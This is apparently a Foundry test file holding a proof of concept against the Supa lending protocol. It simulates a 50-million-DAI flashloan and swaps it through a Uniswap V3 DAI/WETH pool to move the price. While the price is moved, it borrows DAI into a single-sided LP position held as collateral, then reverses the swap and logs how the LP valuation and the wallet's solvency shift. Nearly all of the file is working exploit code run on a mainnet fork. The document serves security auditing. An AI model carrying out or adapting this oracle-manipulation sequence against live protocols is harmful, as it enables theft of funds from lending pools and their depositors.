// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import {INonfungiblePositionManager} from "contracts/external/interfaces/INonfungiblePositionManager.sol";
import {UniV3LPHelper, TickMath} from "contracts/periphery/UniV3LPHelper.sol";
import {FixedPoint96} from "@uniswap/v3-core/contracts/libraries/FixedPoint96.sol";

import {Supa, ISupa} from "contracts/supa/Supa.sol";
import {SupaConfig, ISupaConfig} from "contracts/supa/SupaConfig.sol";
import {VersionManager, IVersionManager} from "contracts/supa/VersionManager.sol";

import {Call} from "contracts/lib/Call.sol";
import {WalletProxy} from "contracts/wallet/WalletProxy.sol";
import {WalletLogic} from "contracts/wallet/WalletLogic.sol";

import {ERC20ChainlinkValueOracle} from "contracts/oracles/ERC20ChainlinkValueOracle.sol";
import {UniV3Oracle} from "contracts/oracles/UniV3Oracle.sol";

import {FsMath} from "contracts/lib/FsMath.sol";

contract SupaWrapper is Supa {
    constructor(
        address _supaConfig,
        address _versionManagerAddress
    ) Supa(_supaConfig, _versionManagerAddress) {}

    function isSolvent(address _wallet) external view returns (bool) {
        return _isSolvent(_wallet);
    }
}

contract VulnerabilityPocTest is Test {
    uint256 mainnetFork;
    string MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");

    INonfungiblePositionManager public nonfungiblePositionManager =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    address public uniswapV3Factory = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    UniV3LPHelper public uniV3LPHelper;
    ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    VersionManager public versionManager;
    SupaWrapper public supa;
    SupaConfig public supaConfig;
    WalletLogic public logic;

    WalletProxy public userWallet;
    WalletProxy public collateralWallet;

    IERC20 public weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // Mainnet WETH
    IERC20 public dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); // Mainnet DAI

    ERC20ChainlinkValueOracle public daiOracle;
    address public daiChainlink = 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9;
    ERC20ChainlinkValueOracle public wethOracle;
    address public ethChainlink = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;

    UniV3Oracle public uniV3Oracle;

    function setUp() public {
        mainnetFork = vm.createFork(MAINNET_RPC_URL);
        vm.selectFork(mainnetFork);
        address owner = address(this);
        versionManager = new VersionManager(owner);
        supaConfig = new SupaConfig(owner);
        supa = new SupaWrapper(address(supaConfig), address(versionManager));
        logic = new WalletLogic(address(supa));

        ISupaConfig(address(supa)).setConfig(
            ISupaConfig.Config({
                treasuryWallet: address(0),
                treasuryInterestFraction: 5e16,
                maxSolvencyCheckGasCost: 1e6,
                liqFraction: 8e17,
                fractionalReserveLeverage: 9
            })
        );

        ISupaConfig(address(supa)).setTokenStorageConfig(
            ISupaConfig.TokenStorageConfig({
                maxTokenStorage: 250,
                erc20Multiplier: 1,
                erc721Multiplier: 1
            })
        );
        uniV3LPHelper = new UniV3LPHelper(
            address(supa),
            address(nonfungiblePositionManager),
            address(uniswapV3Factory),
            address(swapRouter)
        );

        uint8 usdOracleDecimals = 8;
        uint8 tokenDecimals = 18;
        int256 collateralFactor = 1 ether;
        int256 borrowFactor = 1 ether;
        daiOracle = new ERC20ChainlinkValueOracle(
            daiChainlink,
            usdOracleDecimals,
            tokenDecimals,
            collateralFactor,
            borrowFactor,
            owner
        );

        wethOracle = new ERC20ChainlinkValueOracle(
            ethChainlink,
            usdOracleDecimals,
            tokenDecimals,
            collateralFactor,
            borrowFactor,
            owner
        );

        ISupaConfig(address(supa)).addERC20Info(
            address(dai),
            "Dai Stablecoin",
            "Dai",
            18,
            address(daiOracle),
            0, // baseRate
            5, // slope1
            480, // slope2
            8e17 // targetUtilization
        );
        ISupaConfig(address(supa)).addERC20Info(
            address(weth),
            "Wrapped Ether",
            "WETH",
            18,
            address(wethOracle),
            0, // baseRate
            5, // slope1
            480, // slope2
            8e17 // targetUtilization
        );

        uniV3Oracle = new UniV3Oracle(uniswapV3Factory, address(nonfungiblePositionManager), owner);

        uniV3Oracle.setERC20ValueOracle(address(dai), address(daiOracle));
        uniV3Oracle.setERC20ValueOracle(address(weth), address(wethOracle));

        ISupaConfig(address(supa)).addERC721Info(
            address(nonfungiblePositionManager),
            address(uniV3Oracle)
        );

        // add to version manager
        string memory version = "1.0.0";
        versionManager.addVersion(IVersionManager.Status.PRODUCTION, address(logic));
        versionManager.markRecommendedVersion(version);
    }

    /**
     * @notice A Proof of Concept for a potential vulnerability involving a price manipulation on a Uniswap V3 LP token
     */
    function testPoC() public {
        // (1) create wallet
        userWallet = WalletProxy(payable(ISupaConfig(address(supa)).createWallet()));
        collateralWallet = WalletProxy(payable(ISupaConfig(address(supa)).createWallet()));

        // setup config variables
        uint24 fee = 500;
        uint256 daiAmount = 50_000_000 ether; // amount of flashloan
        uint256 daiBorrowAmount = 1_000 ether; // amount to borrow
        uint256 wethCollateral = .57 ether;

        // (2) simulate external flashloan
        deal({token: address(dai), to: address(this), give: daiAmount});

        // (3) deposit WETH collateral
        deal({token: address(weth), to: address(userWallet), give: 1 ether});

        Call[] memory calls = new Call[](2);
        calls[0] = Call({
            to: address(weth),
            callData: abi.encodeWithSelector(weth.approve.selector, address(supa), wethCollateral),
            value: 0
        });
        calls[1] = Call({
            to: address(supa),
            callData: abi.encodeWithSelector(
                supa.depositERC20.selector,
                address(weth),
                wethCollateral
            ),
            value: 0
        });
        userWallet.executeBatch(calls);

        // (4) move pool price
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(dai),
            tokenOut: address(weth),
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: daiAmount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        // get the pool address
        address pool = IUniswapV3Factory(uniswapV3Factory).getPool(
            address(dai),
            address(weth),
            fee
        );

        // get the current pool price
        (uint160 sqrtPriceX96, , , , , , ) = IUniswapV3Pool(pool).slot0();
        console.log("sqrtPriceX96", sqrtPriceX96);

        // get dai balance before swap
        uint256 daiBalanceBefore = dai.balanceOf(address(this));
        console.log("daiBalanceBefore", daiBalanceBefore);

        uint256 wethBalanceBefore = weth.balanceOf(address(this));

        dai.approve(address(swapRouter), daiAmount);
        swapRouter.exactInputSingle(params);

        // Call[] memory swapCalls = new Call[](2);
        // swapCalls[0] = Call({
        //     to: address(dai),
        //     callData: abi.encodeWithSelector(dai.approve.selector, address(swapRouter), daiAmount),
        //     value: 0
        // });
        // swapCalls[1] = Call({
        //     to: address(swapRouter),
        //     callData: abi.encodeWithSelector(swapRouter.exactInputSingle.selector, params),
        //     value: 0
        // });
        // userWallet.executeBatch(swapCalls);

        // get dai balance after swap
        uint256 daiBalanceAfter = dai.balanceOf(address(this));
        console.log("daiBalanceAfter", daiBalanceAfter);

        // get the pool price after first manipulation
        (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(pool).slot0();
        console.log("sqrtPriceX96", sqrtPriceX96);

        uint256 wethBalance = weth.balanceOf(address(this));
        console.log("wethBalanceAfter", wethBalance);

        // deposit DAI collateral to borrow
        deal({token: address(dai), to: address(collateralWallet), give: daiBorrowAmount * 2});

        Call[] memory collateralCalls = new Call[](2);
        collateralCalls[0] = Call({
            to: address(dai),
            callData: abi.encodeWithSelector(
                dai.approve.selector,
                address(supa),
                daiBorrowAmount * 2
            ),
            value: 0
        });
        collateralCalls[1] = Call({
            to: address(supa),
            callData: abi.encodeWithSelector(
                supa.depositERC20.selector,
                address(dai),
                daiBorrowAmount * 2
            ),
            value: 0
        });
        collateralWallet.executeBatch(collateralCalls);

        // (5) create an LP position
        uint256 tokenId = _mintAndDeposit(daiBorrowAmount, fee);

        // get the current lp position value
        (int256 lpValue, int256 riskAdjustedValue) = uniV3Oracle.calcValue(tokenId);
        console.log("lpValue");
        console.logInt(lpValue);

        // (6) move pool price back
        params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(weth),
            tokenOut: address(dai),
            fee: fee,
            recipient: address(userWallet),
            deadline: block.timestamp,
            amountIn: wethBalance,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        weth.approve(address(swapRouter), wethBalance);
        swapRouter.exactInputSingle(params);

        // Call[] memory secondSwapCalls = new Call[](2);
        // secondSwapCalls[0] = Call({
        //     to: address(weth),
        //     callData: abi.encodeWithSelector(
        //         weth.approve.selector,
        //         address(swapRouter),
        //         wethBalance
        //     ),
        //     value: 0
        // });
        // secondSwapCalls[1] = Call({
        //     to: address(swapRouter),
        //     callData: abi.encodeWithSelector(swapRouter.exactInputSingle.selector, params),
        //     value: 0
        // });
        // userWallet.executeBatch(secondSwapCalls);

        // get the new pool price
        (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(pool).slot0();
        console.log("sqrtPriceX96", sqrtPriceX96);

        // get the new lp position value
        (int256 newLpValue, int256 newRiskAdjustedValue) = uniV3Oracle.calcValue(tokenId);
        console.log("newLpValue");
        console.logInt(newLpValue);

        // get the value difference
        int256 valueDiff = newLpValue - lpValue;
        console.log("valueDiff");
        console.logInt(valueDiff);

        // get the risk adjusted value difference
        int256 riskAdjustedValueDiff = newRiskAdjustedValue - riskAdjustedValue;
        console.log("riskAdjustedValueDiff");
        console.logInt(riskAdjustedValueDiff);

        // get the wallet's current value
        (int256 totalValue, int256 collateral, int256 debt) = supa.getRiskAdjustedPositionValues(
            address(userWallet)
        );
        console.log("totalValue after");
        console.logInt(totalValue);
        console.log("collateral after");
        console.logInt(collateral);
        console.log("debt after");
        console.logInt(debt);

        // (9) check if insolvent
        bool isSolvent = supa.isSolvent(address(userWallet));
        console.log("isSolvent", isSolvent);
    }

    // Create a position and deposit LP token to supa
    function _mintAndDeposit(uint256 daiAmount, uint24 fee) internal returns (uint256 tokenId) {
        // get pool
        IUniswapV3Pool pool = IUniswapV3Pool(
            IUniswapV3Factory(uniswapV3Factory).getPool(address(dai), address(weth), fee)
        );

        // get current tick
        (, int24 currentTick, , , , , ) = pool.slot0();

        // get tick spacing
        int24 tickSpacing = pool.tickSpacing();

        // get ticks for single sided mint
        int24 tickLower = nearestUsableTick(currentTick + tickSpacing, tickSpacing);
        int24 tickUpper = nearestUsableTick(currentTick + (tickSpacing * 2), tickSpacing);

        // Construct mint params
        INonfungiblePositionManager.MintParams memory params = INonfungiblePositionManager
            .MintParams({
                token0: address(dai),
                token1: address(weth),
                fee: fee,
                tickLower: tickLower,
                tickUpper: tickUpper,
                amount0Desired: daiAmount,
                amount1Desired: 0,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(userWallet),
                deadline: block.timestamp
            });

        Call[] memory calls = new Call[](3);
        // (1) borrow dai
        calls[0] = Call({
            to: address(supa),
            callData: abi.encodeWithSelector(supa.withdrawERC20.selector, address(dai), daiAmount),
            value: 0
        });

        // (2) approve dai
        calls[1] = Call({
            to: address(dai),
            callData: abi.encodeWithSignature(
                "approve(address,uint256)",
                address(uniV3LPHelper),
                type(uint256).max
            ),
            value: 0
        });

        // (3) mint and deposit LP token
        calls[2] = Call({
            to: address(uniV3LPHelper),
            callData: abi.encodeWithSignature(
                "mintAndDeposit((address,address,uint24,int24,int24,uint256,uint256,uint256,uint256,address,uint256))",
                params
            ),
            value: 0
        });
        userWallet.executeBatch(calls);

        // get the wallet's current value
        (int256 totalValue, int256 collateral, int256 debt) = supa.getRiskAdjustedPositionValues(
            address(userWallet)
        );
        console.log("totalValue");
        console.logInt(totalValue);
        console.log("collateral");
        console.logInt(collateral);
        console.log("debt");
        console.logInt(debt);

        ISupaConfig.NFTData[] memory nftData = ISupaConfig(address(supa)).getCreditAccountERC721(
            address(userWallet)
        );

        // Get the LP token ID
        tokenId = nftData[0].tokenId;

        int256 Q96 = int256(FixedPoint96.Q96);

        address token0;
        address token1;
        int256 liquidity;
        int256 sqrtPrice;
        int256 baseX;
        int256 baseY;
        {
            (
                ,
                ,
                address token0Tmp,
                address token1Tmp,
                uint24 fee,
                int24 tickLower,
                int24 tickUpper,
                uint128 liquidityUnsigned,
                ,
                ,
                ,

            ) = nonfungiblePositionManager.positions(tokenId);
            liquidity = int256(uint256(liquidityUnsigned));
            IUniswapV3Pool pool = IUniswapV3Pool(
                IUniswapV3Factory(uniswapV3Factory).getPool(token0Tmp, token1Tmp, fee)
            );
            (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();
            sqrtPrice = int256(uint256(sqrtPriceX96));
            token0 = token0Tmp;
            token1 = token1Tmp;
            int256 lowerSqrtPrice = int256(uint256(TickMath.getSqrtRatioAtTick(tickLower)));
            int256 upperSqrtPrice = int256(uint256(TickMath.getSqrtRatioAtTick(tickUpper)));
            // Clamp the price into the range
            sqrtPrice = FsMath.clip(sqrtPrice, lowerSqrtPrice, upperSqrtPrice);
            baseX = (liquidity * Q96) / upperSqrtPrice;
            baseY = (lowerSqrtPrice * liquidity) / Q96;
        }
        // X token0 amount, Y token1 amount
        // L = sqrt(X * Y)  p = Y / X
        // Thus sqrt(p) * L = Y and sqrt(p) / L = X

        int256 amountY = (sqrtPrice * liquidity) / Q96 - baseY;
        int256 amountX = (liquidity * Q96) / sqrtPrice - baseX;

        console.log("amountX");
        console.logInt(amountX);
        console.log("amountY");
        console.logInt(amountY);

        return tokenId;
    }

    function nearestUsableTick(
        int24 tick_,
        int24 tickSpacing
    ) internal pure returns (int24 result) {
        result = int24(divRound(int128(tick_), int128(tickSpacing))) * int24(tickSpacing);

        if (result < TickMath.MIN_TICK) {
            result += tickSpacing;
        } else if (result > TickMath.MAX_TICK) {
            result -= tickSpacing;
        }
    }

    function divRound(int128 x, int128 y) internal pure returns (int128 result) {
        int128 quot = div(x, y);
        result = quot >> 64;

        // Check if remainder is greater than 0.5
        if (quot % 2 ** 64 >= 0x8000000000000000) {
            result += 1;
        }
    }

    /*
     * Minimum value signed 64.64-bit fixed point number may have.
     */
    int128 private constant MIN_64x64 = -0x80000000000000000000000000000000;

    /*
     * Maximum value signed 64.64-bit fixed point number may have.
     */
    int128 private constant MAX_64x64 = 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

    /**
     * Calculate x / y rounding towards zero.  Revert on overflow or when y is
     * zero.
     *
     * @param x signed 64.64-bit fixed point number
     * @param y signed 64.64-bit fixed point number
     * @return signed 64.64-bit fixed point number
     */
    function div(int128 x, int128 y) internal pure returns (int128) {
        unchecked {
            require(y != 0);
            int256 result = (int256(x) << 64) / y;
            require(result >= MIN_64x64 && result <= MAX_64x64);
            return int128(result);
        }
    }
}
